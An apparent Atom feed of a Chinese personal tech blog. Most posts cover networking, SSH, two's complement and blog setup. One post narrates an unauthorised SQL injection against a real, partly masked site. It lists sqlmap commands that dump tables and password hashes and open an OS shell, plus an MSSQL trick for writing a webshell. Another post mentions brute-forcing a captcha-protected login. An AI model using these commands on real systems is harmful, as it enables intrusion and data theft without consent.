<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>杜焰</title>
  
  <subtitle>duyan</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://duyana.top/"/>
  <updated>2018-10-09T13:35:29.824Z</updated>
  <id>http://duyana.top/</id>
  
  <author>
    <name>杜焰</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>http协议的一次实践</title>
    <link href="http://duyana.top/post/6b84bc82/"/>
    <id>http://duyana.top/post/6b84bc82/</id>
    <published>2018-09-20T12:23:58.000Z</published>
    <updated>2018-10-09T13:35:29.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#160; &#160; &#160;&#160;今天在爆破登录的时候，由于有验证码，尝试了burpsuite插件，但是只能拿到第一次的验证码，后面的一直重复，看了burpsuite的API，实在找不到问题在哪，于是就想自己写一个爆破工具，识别验证码的插件用的是cnn，识别率很高，主要是免费，但是在构建http请求头部的时候，却遇到了问题，于是去重温了一下http协议。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>&#160; &#160; &#160;&#160;使用HttpUrlConnect构建好http请求头部之后，虽然请求成功，也返回了200状态码，但是返回的数据却与预期不一样，说明这次模拟请求数据构建是有误的，用wireshark抓包发现，在网页中请求时抓包是这样的。</p><p><img src="https://note.youdao.com/yws/api/personal/file/56578ECA9E2041B289230E4627CFCDF3?method=download&amp;shareKey=14c37a2a448e3f3a66a1415be8176dcd" alt="image"></p><p>&#160; &#160; &#160;&#160;而模拟请求时这个JSON字段的值不见了，现在就可以确定是请求体的问题，因为之前使用手机抓包时，JSON字符串前面有PostData这个字段，所以构建的请求体就变成了“Postdata:”+”JSONString”，而实际是不需要“Postdata:”的。虽然是一个很简单的问题，但是却被坑了很久。</p><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>&#160; &#160; &#160;&#160;http是无连接无状态的，即不保持连接，也不知道上一次连接是什么时候。数据量大的时候这样会消耗大量的网络资源，所以后来出现了Kepp-Alive来保持连接，Cookie技术来记录状态。</p><h2 id="TCP三次握手四次挥手"><a href="#TCP三次握手四次挥手" class="headerlink" title="TCP三次握手四次挥手"></a>TCP三次握手四次挥手</h2><p>&#160; &#160; &#160;&#160;前面的文章其实已经记录过TCP三次握手四次挥手，但是之前只知道有这个过程，不知道为什么要有这个过程。</p><ol><li>三次握手四次挥手是建立在<strong>信道不稳定</strong>的基础上的，如果能保证信道是稳定的，那么根本就不需要这么麻烦了，</li><li>这种连接方式是为了保证<strong>连接的可靠性</strong>，而不是为了保证数据的一致。</li><li>怎么保证可靠性？超时重传。但是不对“确认(tcp连接时第三次握手)”进行超时重传。</li><li>不对“确认”进行确认，所以连接时只有三次，而不会反复的确认下去。</li><li>那为什么挥手却需要4次呢，因为挥手需要双方都做好准备，而握手则不需要，因为握手时相当于已经是准备状态，一方请求断开连接(已经做好关闭连接的准备)，另一方并不会马上断开，它可能还有数据要发送，所以它只能先给一个答复(收到了对方断开连接的请求)，事情处理完之后，才发出“已经做完准备，可以断开”的请求，这是第三次挥手，那么对方此时已经在准备状态，只需要确认请求(第四次挥手)即可。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;今天在爆破登录的时候，由于有验证码，尝试了burpsuite插件，但是只能拿到第一次的验
      
    
    </summary>
    
      <category term="book" scheme="http://duyana.top/categories/book/"/>
    
    
  </entry>
  
  <entry>
    <title>第一次SQL注入总结(使用sqlmap)</title>
    <link href="http://duyana.top/post/e05553d0/"/>
    <id>http://duyana.top/post/e05553d0/</id>
    <published>2018-08-19T15:21:54.000Z</published>
    <updated>2018-08-24T14:45:00.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#160; &#160; &#160;&#160;一直有关注安全行业，因为热爱，虽没有投身于安全的工作中，但是也在一点一点的积累，可以说这个行业的门槛太高，要学习的东西太多，没有一套学习体系，也可以说这个行业的门槛太低，一大堆工具可以拿来用。诚以为进入这个行业，必不能心高气傲，一定要善于发现，乐于探索，忍受孤独。</p><p>&#160; &#160; &#160;&#160;漏洞只是开发人员留下的BUG，我在从尽量不留BUG做起。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;www.*****.net.cn/About.aspx?code=0102&quot;</span><br><span class="line">sqlmap -u &quot;www.*****.net.cn/About.aspx?code=0102&quot; --dbs</span><br><span class="line">sqlmap -u &quot;www.*****.net.cn/About.aspx?code=0102&quot; -D yishang --tables</span><br><span class="line">sqlmap -u &quot;www.*****.net.cn/About.aspx?code=0102&quot; -D yishang -T cmd --columns</span><br><span class="line">sqlmap -u &quot;www.*****.net.cn/About.aspx?code=0102&quot; -D yishang -T cmd -C a --dump</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160;&#160;今天终于在非靶机环境发现了一个注入点，用Sqlmap猜解数据库，还发现了别人留下一句话木马。<br><img src="https://note.youdao.com/yws/api/personal/file/1202F11D4AB042FC93B1A97DF274AEAB?method=download&amp;shareKey=7cefc8e1c753fc1d0282f4b31f66fb67" alt="image"></p><p>&#160; &#160; &#160;&#160;原来这个网站早就成为别人的菠菜跳转网站了，心想着为民除害，工具扫后台没有扫出来，直接wget下载了整个网站，哈哈哈，找到了后台登录页面。</p><p><img src="https://note.youdao.com/yws/api/personal/file/353080C1C8654A138F93185167BF7381?method=download&amp;shareKey=5ed0fd27c99d9a77deca3257a1f34c59" alt="image"></p><p>&#160; &#160; &#160;&#160;有人问我有一句话木马了为什么还不上菜刀，因为我一直没能把数据库里面的一句话导出到网页文件中，网上搜索看到这个方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * into [a] in &apos;d:/wwwroot/huashi1/About.aspx;x.xls&apos; &apos;excel 4.0;&apos; from cmd</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160;&#160;但是在这个注入点(‘and’1’=’1)利用不了,也许是我学艺不精，还不知道怎么利用(有看到这里的朋友可以留言指导一下)。</p><h2 id="2018-08-20-20-21-54-更新"><a href="#2018-08-20-20-21-54-更新" class="headerlink" title="2018-08-20 20:21:54 更新"></a>2018-08-20 20:21:54 更新</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./sqlmap.py –u “https://www.anti-x.net/inject.asp?id=injecthere” –-users //列用户</span><br><span class="line">./sqlmap.py –u “https://www.anti-x.net/inject.asp?id=injecthere” –-passwords //获取密码hash</span><br></pre></td></tr></table></figure><p>拿到mssql数据库用户与密码，但是数据库是hash加密的，还加了salt，还是不能破解密码。(三天了还是没有拿到shell,难受)</p><h2 id="2018-08-23-20-10-50-更新"><a href="#2018-08-23-20-10-50-更新" class="headerlink" title="2018-08-23 20:10:50 更新"></a>2018-08-23 20:10:50 更新</h2><p>&#160; &#160; &#160;&#160;今天突然想起，这个注入点是在windows平台上发现的，当是明明有两个payload，怎么kali上面就只有一个了。<br>&#160; &#160; &#160;&#160;于是在windows使用下面这句sqlmap命令，竟然拿到了shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;www.*****.net.cn/About.aspx?code=0102&quot; --os-shell  //系统交互shell</span><br></pre></td></tr></table></figure></p><p><img src="https://note.youdao.com/yws/api/personal/file/9E5B8571C4784EF39EA6AB31A3C7D1F0?method=download&amp;shareKey=bbc9cdd84334ffd9cb6b9765de9c8e18" alt="image"></p><p>&#160; &#160; &#160;&#160;还可以用下面这句指令获得执行指定sql命令的权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;www.*****.net.cn/About.aspx?code=0102&quot; --sql-shell  //执行指定sql命令</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160;&#160;后面就可以尝试提权了，但是为了不被黑产利用这个漏洞，本人决定联系管理员修复，站长工具中找到了邮箱。<br><img src="https://note.youdao.com/yws/api/personal/file/88658D50B3164EB6BADFB8EEFD91712F?method=download&amp;shareKey=db797b9bf86eda3e55da9f43ae98021f" alt="image"><br>到些为止，之后得学习SQL Server数据库操作，还需要学习一下sqlmap源码。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a href="http://www.vuln.cn/1992" target="_blank" rel="noopener">博主–漏洞人生</a></p><p>[2] <a href="https://www.2cto.com/database/201404/294363.html" target="_blank" rel="noopener">红黑联盟</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;一直有关注安全行业，因为热爱，虽没有投身于安全的工作中，但是也在一点一点的积累，可以说这
      
    
    </summary>
    
      <category term="practice" scheme="http://duyana.top/categories/practice/"/>
    
    
  </entry>
  
  <entry>
    <title>二进制负数减法运算为什么要按位取反再加一</title>
    <link href="http://duyana.top/post/6a73a48a/"/>
    <id>http://duyana.top/post/6a73a48a/</id>
    <published>2018-08-09T10:21:54.000Z</published>
    <updated>2018-08-09T11:23:54.659Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#160; &#160; &#160;&#160;从开始接触编程书上就有介绍原码、反码、补码，二进制中减去一个负数的时候，直接运算是会出错的(00001111-10000001=10001110=-14与预期15-(-1)=16有很大偏差)，大家都知道00001111加上10000001这个负数的补码就可以得到正解，但是为什么要加上这个数的补码呢？补码为什么就是按位取反再加一呢？正数的补码为什么就还是原码呢？</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>正数的反码为什么就不用取反呢？</li></ol><p>&#160; &#160; &#160;&#160;因为二进制运算中规定了正数首位用0表示，计算规则其实跟我们平常计算规则是一样的。（如18-06=? 012-013=?）并不会对计算结果产生影响。如果规定用1表示正数的话，那么又是不一样的结果，这个我们不进行讨论。</p><ol start="2"><li>减去一个负数为什么就等于加上这个负数的补码？</li></ol><p>&#160; &#160; &#160;&#160;同理于十进制中的绝对值运算，10-(-8) = 10+|-8| = 10+8，8与-8互为相反数，相信这里大家也能理解补码的概念了，对，就是相反数。0-x=x的相反数。10000001的补码是11111111，大家可以自行测试一下10000001+11111111是不是等于0？</p><ol start="3"><li>补码为什么就是按位取反再加一呢？</li></ol><p>&#160; &#160; &#160;&#160;看完第二个问题可能又会想，二进制数的补码(相反数)为什么这么奇怪呢？10000001(十进制等于-1)与 11111111(十进制等于-127)竟然互为补码(相反数)？其实我们把这些数全部列出来就一目了然了。</p><p><img src="https://note.youdao.com/yws/api/personal/file/B1C6E24AF4C44C388BC2E4DDD8B486A2?method=download&amp;shareKey=c0488e245ce45d8a0f12ee4b70536194" alt="image"></p><p>&#160; &#160; &#160;&#160;上图可以看出一切都是有规律的。用十进制计算，正数-与这个正数垂直对应的负数=0，用二进制计算，正数+与这个正数直线相连的负数=0，那么<strong>这个正数垂直对应的负数</strong>与<strong>这个正数直线相连的负数</strong>互为补码，同样根据第二个问题得出的结论，<strong>这个正数垂直对应的负数</strong>与<strong>这个正数直线相连的负数</strong>互为相反数。那么看图，就可以很清晰的看出来补码为什么就是按位取反再加一了。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>&#160; &#160; &#160;&#160;关键在于理解补码就是相反数这个概念。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;从开始接触编程书上就有介绍原码、反码、补码，二进制中减去一个负数的时候，直接运算是会出错
      
    
    </summary>
    
      <category term="c" scheme="http://duyana.top/categories/c/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次ssh踩过的坑</title>
    <link href="http://duyana.top/post/ee137612/"/>
    <id>http://duyana.top/post/ee137612/</id>
    <published>2018-08-05T15:21:54.000Z</published>
    <updated>2018-08-09T11:21:33.865Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#160; &#160; &#160;&#160;最近买一个树莓派，由于没有HDMI转VGA的线，没有显示屏，只能用ssh操作，开始几天倒没什么，可能总是直接拔电源关机的缘故，损坏了文件系统，重装系统后就再也连不上ssh了。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>&#160; &#160; &#160;&#160;试了网上的很多方法都没有解决，直到看到一篇文章说<strong>cat /var/log/auth.log</strong>可以查看登录日志。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Aug  5 18:53:59 raspberrypi sshd[2171]: fatal: No supported key exchange algorithms [preauth]</span><br><span class="line">Aug  5 18:54:03 raspberrypi sshd[2176]: error: key_load_public: invalid format</span><br><span class="line">Aug  5 18:54:03 raspberrypi sshd[2176]: error: Could not load host key: /etc/ssh/ssh_host_rsa_key</span><br><span class="line">Aug  5 18:54:03 raspberrypi sshd[2176]: error: key_load_public: invalid format</span><br><span class="line">Aug  5 18:54:03 raspberrypi sshd[2176]: error: Could not load host key: /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">Aug  5 18:54:03 raspberrypi sshd[2176]: error: key_load_public: invalid format</span><br><span class="line">Aug  5 18:54:03 raspberrypi sshd[2176]: error: Could not load host key: /etc/ssh/ssh_host_ed25519_key</span><br><span class="line">Aug  5 18:54:03 raspberrypi sshd[2176]: fatal: No supported key exchange algorithms [preauth]</span><br><span class="line">Aug  5 18:54:07 raspberrypi sshd[2184]: error: key_load_public: invalid format</span><br><span class="line">Aug  5 18:54:07 raspberrypi sshd[2184]: error: Could not load host key: /etc/ssh/ssh_host_rsa_key</span><br><span class="line">Aug  5 18:54:07 raspberrypi sshd[2184]: error: key_load_public: invalid format</span><br><span class="line">Aug  5 18:54:07 raspberrypi sshd[2184]: error: Could not load host key: /etc/ssh/ssh_host_ecdsa_key</span><br><span class="line">Aug  5 18:54:07 raspberrypi sshd[2184]: error: key_load_public: invalid format</span><br></pre></td></tr></table></figure><p>难道是key出了问题，那就直接重新生成密钥吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /etc/ssh/ssh_host*</span><br><span class="line">sudo dpkg-reconfigure openssh-server</span><br></pre></td></tr></table></figure><blockquote><p><strong>2018.8.9添加：</strong></p></blockquote><blockquote><p>&#160; &#160; &#160;&#160;由于树莓重新装过系统，但是我的客户端~/.ssh/known_hosts中还是保存着服务端原来的公钥，如日志中所示</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error: key_load_public: invalid format</span><br></pre></td></tr></table></figure><blockquote><p>导致不能加载公钥，至于为什么服务端重新生成密钥之后，服务就重新发开公钥了，还不是很清楚。</p></blockquote><blockquote><p>&#160; &#160; &#160;&#160;<strong>ssh连接流程</strong>：ssh连接有两种方式，一种是密钥连接,需要服务端保存有你在客户端生成的公钥，第二种方式是密码连接，我现在用的就是密码连接，连接时客户端向服务端发出连接请求，服务端会把服务端自己的公钥发给客户端，也就是我们在连接时弹出的安全警告(如下图)，点击接收并保存之后，客户端就会把服务端的公钥就会存到~/.ssh/known_hosts文件中，下次就不会发出警告请求了，接下来客户端会用这个接收到的公钥把输入的密码加密发送给服务端，服务端用私钥解密，以达到登录时加密传输。（此处公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。会存在<strong>中间人攻击</strong>，这也就是为什么会默认(可关闭)弹出警告的原因）<br><img src="http://s3.51cto.com/wyfs02/M02/7E/14/wKiom1b2kG3gEk01AACK7YPNUt8227.png" alt="image"></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>日志是个好东西。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;最近买一个树莓派，由于没有HDMI转VGA的线，没有显示屏，只能用ssh操作，开始几天倒
      
    
    </summary>
    
      <category term="linux" scheme="http://duyana.top/categories/linux/"/>
    
    
  </entry>
  
  <entry>
    <title>浏览器同源策略</title>
    <link href="http://duyana.top/post/7440f480/"/>
    <id>http://duyana.top/post/7440f480/</id>
    <published>2018-07-29T15:23:58.000Z</published>
    <updated>2018-07-31T11:40:11.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#160; &#160; &#160;&#160;这两天可被<strong>浏览器同源策略</strong>这个知识点坑惨了，因为在做SEO优化，想试一下调用百度主动推送的接口。以下是<a href="https://ziyuan.baidu.com/linksubmit/" target="_blank" rel="noopener">官网</a>的接口以及示例</p><p><strong>接口调用地址</strong></p><blockquote><p><a href="http://data.zz.baidu.com/urls?site=www.duyana.top&amp;token=bN9Tyo3t9N****" target="_blank" rel="noopener">http://data.zz.baidu.com/urls?site=www.duyana.top&amp;token=bN9Tyo3t9N****</a>*</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">post推送示例</span><br><span class="line"></span><br><span class="line">POST /urls?site=www.duyana.top&amp;token=bN9Tyo3t9N***** HTTP/1.1</span><br><span class="line">User-Agent: curl/7.12.1 </span><br><span class="line">Host: data.zz.baidu.com </span><br><span class="line">Content-Type: text/plain </span><br><span class="line">Content-Length: 83 </span><br><span class="line">http://www.example.com/1.html</span><br><span class="line">http://www.example.com/2.html</span><br></pre></td></tr></table></figure><h2 id="历程"><a href="#历程" class="headerlink" title="历程"></a>历程</h2><p>&#160; &#160; &#160;&#160;之前了解了一点web，一开始看到这个接口就想写一个本地的web界面来调用，鼓捣了两个晚上，一直以为是JQuery的post构造参数的问题。结果遇到各种报错，后面才了解到<a href="https://www.cnblogs.com/chiangchou/p/jsonp.html" target="_blank" rel="noopener">jsonp</a>,试了一下GET,也不行，说明这个接口百度那边没有<del>回调</del>对回调函数进行处理。<a href="https://blog.csdn.net/shuai_wy/article/details/51186956" target="_blank" rel="noopener">CORS</a>也不支持。</p><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>&#160; &#160; &#160;&#160;打开已经起灰的《白帽子讲web安全》，浏览器安全的第一节就是同源策略。</p><blockquote><p>浏览器的同源策略，限制了来自不同源的“document”或角本，对当前“document”或角本进行修改。</p></blockquote><blockquote><p>服务端可以设置HTTP头是是否允许跨域，这个访问方案的基础就是信任“JavaScript无法控制HTTP头”</p></blockquote><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>&#160; &#160; &#160;&#160;要想浏览器js调用这个接口只能通过代理，用服务端具有网络访问功能的后台语言(ASP.NET,JAVA,PHP,Python等)来调用了，网站中还给出了curl推送，php推送，ruby推送的方法。之后再试一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;这两天可被&lt;strong&gt;浏览器同源策略&lt;/strong&gt;这个知识点坑惨了，因为在做SE
      
    
    </summary>
    
      <category term="web" scheme="http://duyana.top/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>读《计算机是怎么跑起来的》---矢泽久雄/著</title>
    <link href="http://duyana.top/post/63812160/"/>
    <id>http://duyana.top/post/63812160/</id>
    <published>2018-07-28T15:23:58.000Z</published>
    <updated>2018-07-28T18:05:21.744Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>&#160; &#160; &#160;&#160;买了这本书一直没有看，以为是很基础的一本计算机入门书，今天花了一天时候把它看完了，对于我来说收获还是挺多的，这本书只有257页，却把硬件、软件、数据结构、算法、面向对象、数据库、网络等知识点给介绍了一遍，内容通俗，见解却不失深度。</p><h2 id="一些收获"><a href="#一些收获" class="headerlink" title="一些收获"></a>一些收获</h2><hr><blockquote><p>为了驱动CPU的运转，称为“时钟信号”的电信号必不可少，这种电信号每隔一定时间就变换一次电平的高低。输出时钟信号的元件叫做“时钟发生器”。时钟发生器中带晶振，根据<strong>自身的频率</strong>产生时钟信号，时钟信号的频率可以衡量CPU的运转速度。 </p></blockquote><blockquote><p>无论是哪个程序，其内容都是数值的罗列，每个数值要么是指令，要么是数据。</p></blockquote><blockquote><p>无论是哪种编程语言，数据结构的基础都是数组，因此合理的、灵活的运用数组才是关键。</p></blockquote><blockquote><p>面向对象编程就是在为现实世界建模。</p></blockquote><blockquote><p>arp协议，计算机会发给每一台局域网内的其它计算机，“谁的IP地址是192.168.1.110(举例),请将你的MAC地址发给我”，以达到IP转MAC的目的。(arp协议利用:arp欺骗，详情可自行搜索)</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><hr><p>&#160; &#160; &#160;&#160;这本书不是入门书箱，适合有一定基础的同学，且作者的个人见解比较多，不适合深入学习，但会对之后深入学习有很大的帮助。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;买了这本书一直没有看，以为是很基础的一本计算机入门书，今天花了一天时候把它看完
      
    
    </summary>
    
      <category term="book" scheme="http://duyana.top/categories/book/"/>
    
    
  </entry>
  
  <entry>
    <title>hexo Next主题 5.1.4版本下配置Gitalk</title>
    <link href="http://duyana.top/post/59d52da5/"/>
    <id>http://duyana.top/post/59d52da5/</id>
    <published>2018-07-27T13:03:58.000Z</published>
    <updated>2018-07-29T03:28:47.334Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>&#160; &#160; &#160;&#160;关于配置gitalk,本文不求最详细，但求最简单粗暴。适合踩过一些坑之后的同学,从0开始的同学建议结合其它教程使用。</p><h2 id="添加代码"><a href="#添加代码" class="headerlink" title="添加代码"></a>添加代码</h2><hr><p>&#160; &#160; &#160;&#160;位置：blog/themes/next/layout/post.swig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line"></span><br><span class="line">  &lt;div id=&quot;posts&quot; class=&quot;posts-expand&quot;&gt;</span><br><span class="line">    &#123;&#123; post_template.render(page) &#125;&#125;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;post-spread&quot;&gt;</span><br><span class="line">      &#123;% if theme.jiathis %&#125;</span><br><span class="line">        &#123;% include &apos;_partials/share/jiathis.swig&apos; %&#125;</span><br><span class="line">      &#123;% elseif theme.baidushare %&#125;</span><br><span class="line">        &#123;% include &apos;_partials/share/baidushare.swig&apos; %&#125;</span><br><span class="line">      &#123;% elseif theme.add_this_id %&#125;</span><br><span class="line">        &#123;% include &apos;_partials/share/add-this.swig&apos; %&#125;</span><br><span class="line">      &#123;% elseif theme.duoshuo_shortname and theme.duoshuo_share %&#125;</span><br><span class="line">        &#123;% include &apos;_partials/share/duoshuo_share.swig&apos; %&#125;</span><br><span class="line">      &#123;% endif %&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;!-- 下一行是要添加的代码 start  --&gt;</span><br><span class="line">  &lt;!-- Link Gitalk 的支持文件  --&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/gitalk/dist/gitalk.css&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;https://unpkg.com/gitalk@latest/dist/gitalk.min.js&quot;&gt;&lt;/script&gt; </span><br><span class="line">    &lt;div id=&quot;gitalk-container&quot;&gt;&lt;/div&gt;     &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var gitalk = new Gitalk(&#123;</span><br><span class="line"></span><br><span class="line">    // gitalk的主要参数</span><br><span class="line">        clientID: &apos;你的clientID,这个不会创建的话去其它教程看一下&apos;,</span><br><span class="line">        clientSecret: &apos;你的clientSecret,这个不会创建的话去其它教程看一下&apos;,</span><br><span class="line">        repo: &apos;你的仓库名，仓库名，仓库名，不是地址！&apos;,</span><br><span class="line">        owner: &apos;你的用户名&apos;,</span><br><span class="line">        admin: [&apos;你的用户名&apos;],</span><br><span class="line">        id: window.location.pathname,</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">    gitalk.render(&apos;gitalk-container&apos;);</span><br><span class="line">  &lt;/script&gt; </span><br><span class="line">  &lt;!-- Gitalk end --&gt;</span><br><span class="line">  &lt;!-- 到一上行结束 end  --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160;&#160;把文件中添加的代码加上(看注释),然后把后面的参数填上。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><hr><blockquote><p>&#160; &#160; &#160;&#160;1. GitHub -&gt; OAuth -&gt; Authorization callback URL：这里要填博客地址,绑定了域名就填域名。加http(s)://</p></blockquote><blockquote><p>&#160; &#160; &#160;&#160;2. 上面代码中repo后面可以用一个新建的仓库,但注意只填名字就行了。</p></blockquote><blockquote><p>&#160; &#160; &#160;&#160;3. 用户名要填对。</p></blockquote><blockquote><p>&#160; &#160; &#160;&#160;4. 设置完之后若显示<strong>未找到相关的issues进行评论</strong>,请在提示下方点击登录Github,每篇文章页面都需要点击一次进行初始化。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;关于配置gitalk,本文不求最详细，但求最简单粗暴。适合踩过一些坑之后的同学
      
    
    </summary>
    
      <category term="hexo" scheme="http://duyana.top/categories/hexo/"/>
    
    
  </entry>
  
  <entry>
    <title>mx.zugehao.com不能登录的,看这里！！！</title>
    <link href="http://duyana.top/post/5354b010/"/>
    <id>http://duyana.top/post/5354b010/</id>
    <published>2018-07-27T03:23:58.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
